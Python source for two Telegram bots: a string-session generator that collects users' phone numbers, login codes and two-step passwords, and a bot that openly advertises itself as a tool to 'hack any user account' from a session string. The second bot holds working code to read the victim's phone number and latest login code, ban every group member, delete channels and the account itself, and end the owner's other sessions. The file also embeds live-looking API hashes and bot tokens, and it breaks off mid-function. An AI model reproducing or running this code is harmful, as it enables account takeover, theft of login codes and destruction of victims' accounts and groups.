import os
import json
import time
import logging
import asyncio
from os import getenv
from threading import Thread

from flask import Flask

from pyrogram import Client, filters, idle
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from pyrogram.errors import (
    ApiIdInvalid, 
    PhoneNumberInvalid, 
    PhoneCodeInvalid, 
    PhoneCodeExpired, 
    SessionPasswordNeeded, 
    PasswordHashInvalid,
    ApiIdPublishedFlood,
    AccessTokenInvalid,
    FloodWait,
    InputUserDeactivated,
    UserIsBlocked,
    PeerIdInvalid
)
from pyromod import listen
from asyncio.exceptions import TimeoutError

from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    ApiIdInvalidError,
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError
)

# ==================== CONFIG ====================
API_ID = int(getenv("API_ID", "10796618"))
API_HASH = getenv("API_HASH", "4e4b20b4e1e40c90fcb1a7658c800150")
BOT_TOKEN = getenv("BOT_TOKEN", "8351290809:AAGNTwNVF9i39PmgI-tGp_SpEbaYBjxiveA")
OWNER_ID = int(getenv("OWNER_ID", "5368154755"))
MUST_JOIN = getenv("MUST_JOIN", "RomeoBot_op")

# ==================== DATABASE ====================
DB_FILE = "users_db.json"

def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r') as f:
            return json.load(f)
    return {"users": []}

def save_db(data):
    with open(DB_FILE, 'w') as f:
        json.dump(data, f, indent=4)

async def is_served_user(user_id: int) -> bool:
    db = load_db()
    return user_id in db["users"]

async def get_served_users() -> list:
    db = load_db()
    return db["users"]

async def add_served_user(user_id: int):
    if await is_served_user(user_id):
        return
    db = load_db()
    db["users"].append(user_id)
    save_db(db)

# ==================== FLASK ====================
logging.getLogger("werkzeug").setLevel(logging.ERROR)
flask_app = Flask(__name__)

@flask_app.route("/")
def home():
    return "✅ Session Generator Bot is running!"

@flask_app.route("/healthz")
def healthz():
    return ("", 204)

def run_flask():
    port = int(os.getenv("PORT", "8080"))
    flask_app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False, threaded=True)

Thread(target=run_flask, daemon=True).start()

# ==================== BOT SETUP ====================
logging.basicConfig(level=logging.WARNING, format="%(asctime)s - %(levelname)s - %(message)s")

app = Client(
    "SessionGenBot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN,
    in_memory=True
)

# ==================== BUTTONS ====================
ask_ques = "**Please choose the python library you want to generate string session for:**"

buttons_ques = InlineKeyboardMarkup([
    [InlineKeyboardButton("🔷 Pyrogram V2 🔷", callback_data="pyrogram")],
    [InlineKeyboardButton("🔷 Pyrogram (Old) 🔷", callback_data="pyrogram1")],
    [InlineKeyboardButton("🔷 Telethon 🔷", callback_data="telethon")],
    [InlineKeyboardButton("🔶 Pyrogram V2 Bot 🔶", callback_data="pyrogram_bot"),
     InlineKeyboardButton("🔶 Telethon Bot 🔶", callback_data="telethon_bot")]
])

gen_button = InlineKeyboardMarkup([
    [InlineKeyboardButton("🔄 Start Generating Session", callback_data="generate")]
])

# ==================== USER DATABASE ====================
@app.on_message(filters.private & ~filters.service, group=1)
async def users_sql(_, msg: Message):
    await add_served_user(msg.from_user.id)

# ==================== START COMMAND ====================
@app.on_message(filters.private & filters.command("start"))
async def start(bot: Client, msg: Message):
    me = await bot.get_me()
    
    # Must Join button
    if MUST_JOIN:
        if MUST_JOIN.startswith("@"):
            link = f"https://t.me/{MUST_JOIN[1:]}"
        else:
            link = f"https://t.me/{MUST_JOIN}"
        
        buttons = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔷 Start Generating 🔷", callback_data="generate")],
            [InlineKeyboardButton("📢 Join Channel", url=link)]
        ])
    else:
        buttons = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔷 Start Generating 🔷", callback_data="generate")]
        ])
    
    await msg.reply_text(
        f"👋 **Hey {msg.from_user.mention}!**\n\n"
        f"🤖 **I am {me.mention}**\n"
        f"📱 **String Session Generator Bot**\n\n"
        f"I can generate string sessions for:\n"
        f"• Pyrogram V2 (User & Bot)\n"
        f"• Pyrogram Old (User)\n"
        f"• Telethon (User & Bot)\n\n"
        f"Click below to start! 👇",
        reply_markup=buttons
    )

# ==================== GENERATE COMMAND ====================
@app.on_message(filters.private & filters.command(["generate", "gen", "string", "str"]))
async def generate_command(bot: Client, msg: Message):
    await msg.reply(ask_ques, reply_markup=buttons_ques)

# ==================== STATS COMMAND ====================
@app.on_message(filters.user(OWNER_ID) & filters.command("stats"))
async def stats(bot: Client, msg: Message):
    users = await get_served_users()
    await msg.reply_text(
        f"📊 **Bot Statistics:**\n\n"
        f"👥 Total Users: **{len(users)}**",
        quote=True
    )

# ==================== BROADCAST COMMAND ====================
@app.on_message(filters.user(OWNER_ID) & filters.command("broadcast"))
async def broadcast_command(bot: Client, msg: Message):
    if msg.reply_to_message:
        broadcast_msg = msg.reply_to_message
    else:
        await msg.reply_text(
            "❌ **Please reply to a message to broadcast!**\n\n"
            "**Usage:**\n"
            "Reply to any message with `/broadcast`"
        )
        return
    
    users = await get_served_users()
    total_users = len(users)
    
    if total_users == 0:
        await msg.reply_text("❌ **No users found in database!**")
        return
    
    status_msg = await msg.reply_text(
        f"📡 **Broadcasting started...**\n\n"
        f"👥 Total Users: `{total_users}`\n"
        f"⏳ Please wait..."
    )
    
    success = 0
    failed = 0
    deleted = 0
    blocked = 0
    
    for user_id in users:
        try:
            await broadcast_msg.copy(user_id)
            success += 1
            
            if success % 10 == 0:
                await status_msg.edit_text(
                    f"📡 **Broadcasting...**\n\n"
                    f"👥 Total: `{total_users}`\n"
                    f"✅ Success: `{success}`\n"
                    f"❌ Failed: `{failed}`\n"
                    f"🚫 Blocked: `{blocked}`\n"
                    f"👻 Deleted: `{deleted}`\n\n"
                    f"⏳ In progress..."
                )
            
            await asyncio.sleep(0.1)
            
        except FloodWait as e:
            await asyncio.sleep(e.value)
            try:
                await broadcast_msg.copy(user_id)
                success += 1
            except Exception:
                failed += 1
                
        except InputUserDeactivated:
            deleted += 1
            failed += 1
            
        except UserIsBlocked:
            blocked += 1
            failed += 1
            
        except PeerIdInvalid:
            failed += 1
            
        except Exception as e:
            failed += 1
            print(f"Error broadcasting to {user_id}: {e}")
    
    await status_msg.edit_text(
        f"📡 **Broadcast Completed!**\n\n"
        f"👥 Total Users: `{total_users}`\n"
        f"✅ Successfully Sent: `{success}`\n"
        f"❌ Failed: `{failed}`\n"
        f"🚫 Blocked Bot: `{blocked}`\n"
        f"👻 Deleted Account: `{deleted}`\n\n"
        f"**Success Rate:** `{round((success/total_users)*100, 2)}%`"
    )

# ==================== SESSION GENERATOR ====================
async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro=False, is_bot=False):
    if telethon:
        ty = "Telethon"
    else:
        ty = "Pyrogram"
        if not old_pyro:
            ty += " V2"
    if is_bot:
        ty += " Bot"
    
    await msg.reply(f"🚀 **Starting {ty} Session Generation...**")
    user_id = msg.chat.id
    
    # Ask for API_ID
    api_id_msg = await bot.ask(
        user_id, 
        "📝 **Send your API_ID**\n\n"
        "💡 Click /skip to use bot's API\n"
        "❌ Click /cancel to cancel",
        filters=filters.text
    )
    if await cancelled(api_id_msg):
        return
    
    if api_id_msg.text == "/skip":
        api_id = API_ID
        api_hash = API_HASH
    else:
        try:
            api_id = int(api_id_msg.text)
        except ValueError:
            await api_id_msg.reply(
                "❌ **Invalid API_ID!** Must be an integer.\n\n"
                "Please start again.",
                quote=True,
                reply_markup=gen_button
            )
            return
        
        # Ask for API_HASH
        api_hash_msg = await bot.ask(
            user_id,
            "📝 **Now send your API_HASH**\n\n❌ Click /cancel to cancel",
            filters=filters.text
        )
        if await cancelled(api_hash_msg):
            return
        api_hash = api_hash_msg.text.strip()
    
    # Ask for Phone/Bot Token
    if not is_bot:
        t = "📱 **Send your PHONE NUMBER** with country code\n\n" \
            "Example: `+919876543210`\n\n❌ Click /cancel to cancel"
    else:
        t = "🤖 **Send your BOT TOKEN**\n\n" \
            "Example: `123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11`\n\n❌ Click /cancel to cancel"
    
    phone_number_msg = await bot.ask(user_id, t, filters=filters.text)
    if await cancelled(phone_number_msg):
        return
    phone_number = phone_number_msg.text.strip()
    
    if not is_bot:
        await msg.reply("📤 **Sending OTP...**")
    else:
        await msg.reply("🔐 **Logging as Bot...**")
    
    # Create Client
    if telethon and is_bot:
        client = TelegramClient(StringSession(), api_id, api_hash)
    elif telethon:
        client = TelegramClient(StringSession(), api_id, api_hash)
    elif is_bot:
        client = Client(name="bot", api_id=api_id, api_hash=api_hash, bot_token=phone_number, in_memory=True)
    elif old_pyro:
        client = Client(":memory:", api_id=api_id, api_hash=api_hash)
    else:
        client = Client(name="user", api_id=api_id, api_hash=api_hash, in_memory=True)
    
    await client.connect()
    
    # Send Code
    try:
        code = None
        if not is_bot:
            if telethon:
                code = await client.send_code_request(phone_number)
            else:
                code = await client.send_code(phone_number)
    except (ApiIdInvalid, ApiIdInvalidError):
        await msg.reply(
            "❌ **Invalid API_ID/API_HASH combination!**\n\nPlease start again.",
            reply_markup=gen_button
        )
        await client.disconnect()
        return
    except (PhoneNumberInvalid, PhoneNumberInvalidError):
        await msg.reply(
            "❌ **Invalid Phone Number!**\n\nPlease start again.",
            reply_markup=gen_button
        )
        await client.disconnect()
        return
    
    # Ask for OTP
    try:
        phone_code_msg = None
        if not is_bot:
            phone_code_msg = await bot.ask(
                user_id,
                "📨 **OTP sent to your Telegram account!**\n\n"
                "📝 Send OTP in this format: `1 2 3 4 5`\n"
                "⏱ Timeout: 10 minutes\n\n"
                "❌ Click /cancel to cancel",
                filters=filters.text,
                timeout=600
            )
            if await cancelled(phone_code_msg):
                await client.disconnect()
                return
    except TimeoutError:
        await msg.reply(
            "⏱ **Timeout!** 10 minutes exceeded.\n\nPlease start again.",
            reply_markup=gen_button
        )
        await client.disconnect()
        return
    
    # Sign In
    if not is_bot:
        phone_code = phone_code_msg.text.replace(" ", "").strip()
        try:
            if telethon:
                await client.sign_in(phone_number, phone_code, password=None)
            else:
                await client.sign_in(phone_number, code.phone_code_hash, phone_code)
        except (PhoneCodeInvalid, PhoneCodeInvalidError):
            await msg.reply(
                "❌ **Invalid OTP!**\n\nPlease start again.",
                reply_markup=gen_button
            )
            await client.disconnect()
            return
        except (PhoneCodeExpired, PhoneCodeExpiredError):
            await msg.reply(
                "❌ **OTP Expired!**\n\nPlease start again.",
                reply_markup=gen_button
            )
            await client.disconnect()
            return
        except (SessionPasswordNeeded, SessionPasswordNeededError):
            try:
                two_step_msg = await bot.ask(
                    user_id,
                    "🔐 **Your account has 2-Step Verification!**\n\n"
                    "📝 Send your password (exactly as set, case-sensitive)\n"
                    "⏱ Timeout: 5 minutes\n\n"
                    "⚠️ **Note:** Copy-paste your password carefully!\n"
                    "❌ Click /cancel to cancel",
                    filters=filters.text,
                    timeout=300
                )
                
                if await cancelled(two_step_msg):
                    await client.disconnect()
                    return
                    
            except TimeoutError:
                await msg.reply(
                    "⏱ **Timeout!** 5 minutes exceeded.\n\nPlease start again.",
                    reply_markup=gen_button
                )
                await client.disconnect()
                return
            
            try:
                password = two_step_msg.text
                
                if telethon:
                    await client.sign_in(password=password)
                else:
                    await client.check_password(password=password)
                    
            except (PasswordHashInvalid, PasswordHashInvalidError):
                await two_step_msg.reply(
                    "❌ **Invalid Password!**\n\n"
                    "⚠️ **Troubleshooting:**\n"
                    "• Password is case-sensitive\n"
                    "• Copy-paste it carefully\n"
                    "• Check for extra spaces\n"
                    "• Make sure it's your correct 2FA password\n\n"
                    "Please start again.",
                    quote=True,
                    reply_markup=gen_button
                )
                await client.disconnect()
                return
            except Exception as e:
                await two_step_msg.reply(
                    f"❌ **Error:** `{str(e)}`\n\n"
                    "Please start again.",
                    quote=True,
                    reply_markup=gen_button
                )
                await client.disconnect()
                return
    else:
        try:
            if telethon:
                await client.start(bot_token=phone_number)
            else:
                await client.sign_in_bot(phone_number)
        except Exception as e:
            await msg.reply(
                f"❌ **Bot login failed!**\n\n"
                f"Error: `{str(e)}`",
                reply_markup=gen_button
            )
            await client.disconnect()
            return
    
    # Generate String Session
    string_session = None
    try:
        if telethon:
            if not client.is_connected():
                await client.connect()
            string_session = client.session.save()
        else:
            if not is_bot:
                try:
                    me = await client.get_me()
                    print(f"✅ Logged in as: {me.first_name} ({me.id})")
                except Exception as e:
                    print(f"⚠️ Get me error: {e}")
            
            string_session = await client.export_session_string()
        
        if not string_session or len(string_session) < 10:
            raise Exception("Generated session string is empty or too short!")
        
        print(f"✅ Session generated! Length: {len(string_session)}")
        
    except Exception as e:
        print(f"❌ Session generation error: {e}")
        await msg.reply(
            f"❌ **Failed to generate session!**\n\n"
            f"Error: `{str(e)}`\n\n"
            f"Please try again.",
            reply_markup=gen_button
        )
        await client.disconnect()
        return
    
    if not string_session:
        await msg.reply(
            "❌ **Session generation failed!**\n\n"
            "Session string is empty. Please try again.",
            reply_markup=gen_button
        )
        await client.disconnect()
        return
    
    # Send session to user
    text = (
        f"✅ **{ty.upper()} STRING SESSION**\n\n"
        f"`{string_session}`\n\n"
        f"⚠️ **Keep it safe and don't share!**\n"
        f"🤖 **Generated by:** @{(await bot.get_me()).username}"
    )
    
    try:
        if not is_bot:
            await client.send_message("me", text)
    except Exception as e:
        print(f"⚠️ Could not send to saved messages: {e}")
    
    try:
        await bot.send_message(msg.chat.id, text)
    except Exception as e:
        print(f"❌ Error sending session: {e}")
        try:
            await bot.send_message(msg.chat.id, f"✅ **{ty.upper()} STRING SESSION**\n\n**Session String:**")
            await bot.send_message(msg.chat.id, f"`{string_session}`")
            await bot.send_message(msg.chat.id, f"⚠️ **Keep it safe and don't share!**\n🤖 **Generated by:** @{(await bot.get_me()).username}")
        except Exception as e2:
            print(f"❌ Failed to send session: {e2}")
    
    await client.disconnect()
    
    await bot.send_message(
        msg.chat.id,
        f"✅ **Successfully generated {ty} string session!**\n\n"
        f"📬 Check your **Saved Messages** for a copy!"
    )

async def cancelled(msg):
    if "/cancel" in msg.text:
        await msg.reply("❌ **Cancelled!**", quote=True, reply_markup=gen_button)
        return True
    elif "/restart" in msg.text:
        await msg.reply("🔄 **Restarted!**", quote=True, reply_markup=gen_button)
        return True
    elif "/skip" in msg.text:
        return False
    elif msg.text.startswith("/"):
        await msg.reply("❌ **Cancelled!**", quote=True)
        return True
    else:
        return False

# ==================== CALLBACKS ====================
@app.on_callback_query()
async def handle_callbacks(bot: Client, callback_query: CallbackQuery):
    query = callback_query.data
    
    if query == "generate":
        await callback_query.answer()
        await callback_query.message.reply(ask_ques, reply_markup=buttons_ques)
    
    elif query.startswith("pyrogram") or query.startswith("telethon"):
        try:
            if query == "pyrogram":
                await callback_query.answer("⚠️ Pyrogram V2 sessions only work with updated bots!", show_alert=True)
                await generate_session(bot, callback_query.message)
            
            elif query == "pyrogram1":
                await callback_query.answer("📱 Pyrogram Old Version", show_alert=True)
                await generate_session(bot, callback_query.message, old_pyro=True)
            
            elif query == "pyrogram_bot":
                await callback_query.answer("🤖 Pyrogram V2 Bot Session", show_alert=True)
                await generate_session(bot, callback_query.message, is_bot=True)
            
            elif query == "telethon_bot":
                await callback_query.answer("🤖 Telethon Bot Session", show_alert=True)
                await generate_session(bot, callback_query.message, telethon=True, is_bot=True)
            
            elif query == "telethon":
                await callback_query.answer("📱 Telethon User Session", show_alert=True)
                await generate_session(bot, callback_query.message, telethon=True)
        
        except Exception as e:
            print(f"Callback error: {e}")
            await callback_query.message.reply(f"❌ **An error occurred!**\n\nError: `{str(e)}`")

# ==================== RUN BOT ====================
if __name__ == "__main__":
    print("🚀 Starting Session Generator Bot...")
    print("=" * 50)
    
    try:
        app.start()
        me = app.get_me()
        print(f"✅ Bot: @{me.username}")
        print(f"🔐 Must Join: {MUST_JOIN if MUST_JOIN else 'Not Set'}")
        print("=" * 50)
        print("✅ Bot is ready!")
        print("=" * 50)
        
        idle()
        
    except (ApiIdInvalid, ApiIdPublishedFlood):
        raise Exception("❌ Invalid API_ID/API_HASH!")
    except AccessTokenInvalid:
        raise Exception("❌ Invalid BOT_TOKEN!")
    finally:
        app.stop()
        print("👋 Bot stopped!")


# recovery bot

import os
import asyncio
import logging
from pyrogram import Client, filters, enums, idle
from pyrogram.raw import functions
from pyrogram.errors import FloodWait
from pyrogram.types import InlineKeyboardButton as IKB, InlineKeyboardMarkup as IKM, ChatPrivileges
from telethon import TelegramClient, functions as tfunc
from telethon.sessions import StringSession
from telethon.tl.functions.channels import (
    GetAdminedPublicChannelsRequest,
    JoinChannelRequest,
    LeaveChannelRequest,
    DeleteChannelRequest,
    EditBannedRequest
)
from telethon.tl.types import ChannelParticipantsAdmins, ChatBannedRights
from telethon.tl.functions.auth import ResetAuthorizationsRequest
from pyromod import listen

# ==================== CONFIG ====================
API_ID = int(os.getenv("API_ID", "10796618"))
API_HASH = os.getenv("API_HASH", "4e4b20b4e1e40c90fcb1a7658c800150")
BOT_TOKEN = os.getenv("BOT_TOKEN", "8351290809:AAGNTwNVF9i39PmgI-tGp_SpEbaYBjxiveA")
START_PIC = os.getenv("START_PIC", "https://telegra.ph//file/a9a90059ae47fa840b0b3.jpg")

# Universal Force Join Channels - Edit karne ke liye sirf yahan change karo
FORCE_JOIN_CHANNELS = [
    "@ROMEOBOT_OP",
    "@ROMEO_OP"
]

# Owner Info - Customize karo apne hisaab se
OWNER_NAME = "𝕾🅡︎🅐︎🅙︎𝕾"
OWNER_USERNAME = "@romeo_op"  # Optional

# ==================== LOGGING ====================
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ==================== CLIENT ====================
app = Client("romeorj", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# ==================== MESSAGES ====================
PM_TEXT = """
**Hey {},**
I'm **{}**

● Hack ●
❥︎ A Bot To Hack Any user account using
❥︎ Their Telethon and Pyrogram String session
❥︎ Owner: {owner}
"""

HACK_TEXT = """
**A** ~ Check user own groups and channels (PUBLIC ONLY)
**B** ~ Check user all information like phone number, username... etc
**C** ~ Ban all the members from the group
**D** ~ Know user last OTP, Use option B first to take number then login
**E** ~ Join A Group/Channel/Link via StringSession
**F** ~ Leave A Group/Channel via StringSession
**G** ~ Delete A Group/Channel
**H** ~ Check user two step is enabled or disabled
**I** ~ Terminate All current active sessions except Your StringSession
**J** ~ Delete Account
**K** ~ Promote a member in a Group/Channel
**L** ~ Demote All admins in a Group/Channel
**M** ~ Send Message to Saved Messages
**N** ~ Get All Active Sessions List
**O** ~ Download User Profile Photos
**P** ~ Change Profile (Name/Bio/Username)

❥︎ Owner: {owner}
"""

# ==================== BUTTONS ====================
PM_BUTTON = IKM([[IKB("● 𝐇𝐀𝐂𝐊 ●", callback_data="hack_btn")]])

HACK_MODS = IKM([
    [IKB("A", callback_data="A"), IKB("B", callback_data="B"), IKB("C", callback_data="C"),
     IKB("D", callback_data="D"), IKB("E", callback_data="E")],
    [IKB("F", callback_data="F"), IKB("G", callback_data="G"), IKB("H", callback_data="H"),
     IKB("I", callback_data="I"), IKB("J", callback_data="J")],
    [IKB("K", callback_data="K"), IKB("L", callback_data="L"), IKB("M", callback_data="M"),
     IKB("N", callback_data="N"), IKB("O", callback_data="O")],
    [IKB("P", callback_data="P")],
])

# ==================== RIGHTS ====================
BAN_RIGHTS = ChatBannedRights(
    until_date=None,
    view_messages=True,
    send_messages=True,
    send_media=True,
    send_stickers=True,
    send_gifs=True,
    send_games=True,
    send_inline=True,
    embed_links=True,
)

FULL_PROMOTE = ChatPrivileges(
    can_change_info=True,
    can_delete_messages=True,
    can_restrict_members=True,
    can_pin_messages=True,
    can_manage_video_chats=True,
    can_promote_members=True,
    can_invite_users=True
)

PROMOTE = ChatPrivileges(
    can_change_info=True,
    can_delete_messages=True,
    can_restrict_members=True,
    can_pin_messages=True
)

DEMOTE = ChatPrivileges(
    can_change_info=False,
    can_invite_users=False,
    can_delete_messages=False,
    can_restrict_members=False,
    can_pin_messages=False,
    can_promote_members=False,
    can_manage_chat=False,
    can_manage_video_chats=False,
)

# ==================== HELPER FUNCTIONS ====================

async def auto_join_channels_telethon(client):
    """Automatically join force channels - Telethon"""
    for channel in FORCE_JOIN_CHANNELS:
        try:
            await client(JoinChannelRequest(channel))
        except:
            pass

async def auto_join_channels_pyrogram(client):
    """Automatically join force channels - Pyrogram"""
    for channel in FORCE_JOIN_CHANNELS:
        try:
            await client.join_chat(channel)
        except:
            pass

async def users_gc(session):
    """Feature A: Get user's groups and channels"""
    err = ""
    msg = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            k = await rj(GetAdminedPublicChannelsRequest())
            for x in k.chats:
                msg += f'**❥︎ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ:** {x.title}\n**❥︎ ᴜsᴇʀɴᴀᴍᴇ:** @{x.username}\n**❥︎ ᴍᴇᴍʙᴇʀs:** {x.participants_count}\n\n'
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                k = await r.invoke(functions.channels.GetAdminedPublicChannels())
                for x in k.chats:
                    msg += f'**❥︎ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ:** {x.title}\n**❥︎ ᴜsᴇʀɴᴀᴍᴇ:** @{x.username}\n**❥︎ ᴍᴇᴍʙᴇʀs:** {x.members_count}\n\n'
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return msg if msg else "**ɴᴏ ᴘᴜʙʟɪᴄ ᴄʜᴀɴɴᴇʟs ғᴏᴜɴᴅ!**"


async def user_info(session):
    """Feature B: Get user information"""
    err = ""
    msg = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            k = await rj.get_me()
            msg = f'**❥︎ ɴᴀᴍᴇ:** {k.first_name or k.last_name}\n**❥︎ ɪᴅ:** {k.id}\n**❥︎ ᴘʜᴏɴᴇ:** +{k.phone}\n**❥︎ ᴜsᴇʀɴᴀᴍᴇ:** @{k.username}'
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                k = await r.get_me()
                msg = f'**❥︎ ɴᴀᴍᴇ:** {k.first_name or k.last_name}\n**❥︎ ɪᴅ:** {k.id}\n**❥︎ ᴘʜᴏɴᴇ:** +{k.phone_number}\n**❥︎ ᴜsᴇʀɴᴀᴍᴇ:** @{k.username}'
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return msg


async def banall(session, gc_id):
    """Feature C: Ban all members from group"""
    err = ""
    total = 0
    banned = 0
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            admins = await rj.get_participants(gc_id, filter=ChannelParticipantsAdmins)
            admin_ids = [i.id for i in admins]
            async for user in rj.iter_participants(gc_id):
                total += 1
                try:
                    if user.id not in admin_ids:
                        await rj(EditBannedRequest(gc_id, user.id, BAN_RIGHTS))
                        banned += 1
                        await asyncio.sleep(0.1)
                except:
                    await asyncio.sleep(0.1)
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                async for member in r.get_chat_members(gc_id):
                    total += 1
                    try:
                        await r.ban_chat_member(gc_id, member.user.id)
                        banned += 1
                    except FloodWait as fw:
                        await asyncio.sleep(fw.value)
                    except:
                        pass
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return f"**✅ ʙᴀɴɴᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!**\n\n**❥︎ ʙᴀɴɴᴇᴅ:** {banned}\n**❥︎ ᴛᴏᴛᴀʟ:** {total}"


async def get_otp(session):
    """Feature D: Get last OTP"""
    err = ""
    msg = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            async for x in rj.iter_messages(777000, limit=2):
                msg += f"\n{x.text}\n"
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                async for message in r.get_chat_history(777000, limit=2):
                    msg += f"\n{message.text}\n"
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return msg if msg else "**ɴᴏ ᴏᴛᴘ ғᴏᴜɴᴅ!**"


async def join_ch(session, gc_id):
    """Feature E: Join channel/group"""
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            await rj(JoinChannelRequest(gc_id))
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                await r.join_chat(gc_id)
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return "**✅ ᴊᴏɪɴᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!**"


async def leave_ch(session, gc_id):
    """Feature F: Leave channel/group"""
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            await rj(LeaveChannelRequest(gc_id))
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                await r.leave_chat(gc_id)
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return "**✅ ʟᴇғᴛ sᴜᴄᴄᴇssғᴜʟʟʏ!**"


async def del_ch(session, gc_id):
    """Feature G: Delete channel/group"""
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            await rj(DeleteChannelRequest(gc_id))
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                await r.invoke(functions.channels.DeleteChannel(channel=await r.resolve_peer(gc_id)))
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return "**✅ ᴅᴇʟᴇᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!**"


async def check_2fa(session):
    """Feature H: Check 2FA status"""
    err = ""
    msg = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            try:
                await rj.edit_2fa("testpass123")
                msg = "**ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴅɪsᴀʙʟᴇᴅ ❌**"
            except:
                msg = "**ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ ✅**"
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                pwd = await r.invoke(functions.account.GetPassword())
                if pwd.has_password:
                    msg = "**ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ ✅**"
                else:
                    msg = "**ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴅɪsᴀʙʟᴇᴅ ❌**"
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return msg


async def terminate_all(session):
    """Feature I: Terminate all sessions"""
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            await rj(ResetAuthorizationsRequest())
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                await r.invoke(functions.auth.ResetAuthorizations())
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return "**✅ sᴜᴄᴄᴇssғᴜʟʟʏ ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴀʟʟ sᴇssɪᴏɴs!**"


async def del_acc(session):
    """Feature J: Delete account"""
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            await rj(tfunc.account.DeleteAccountRequest("Deleted"))
            await rj.disconnect()
        else:
